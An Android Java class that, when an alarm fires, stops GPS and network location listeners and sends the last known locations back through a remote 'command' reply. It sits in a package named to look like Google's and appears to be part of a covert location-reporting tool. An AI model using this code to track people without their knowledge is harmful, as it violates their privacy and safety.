package com.google.cachesync;

import com.code4bones.utils.NetLog;

import android.app.AlarmManager;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.location.LocationManager;


public class LocationTimer extends BroadcastReceiver {

	@Override
	public void onReceive(Context context, Intent intent) {
		
		AlarmManager alarm = (AlarmManager)context.getSystemService(Context.ALARM_SERVICE);
		alarm.cancel(GpsLocationListener.pendingIntent);
		
		GpsLocationListener gps = GpsLocationListener.getInstance(context,GpsLocationListener.GPS);
		GpsLocationListener network = GpsLocationListener.getInstance(context,GpsLocationListener.NETWORK);
		
		LocationManager locMgr = (LocationManager)context.getSystemService(Context.LOCATION_SERVICE);
		if ( locMgr == null ) 
			return;
		
		locMgr.removeUpdates(gps);
		locMgr.removeUpdates(network);
		
		NetLog.v("Location Monitor Removed...\n");
		try {
			GpsLocationListener.command.Reply(gps.lastLocation,network.lastLocation);
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

}
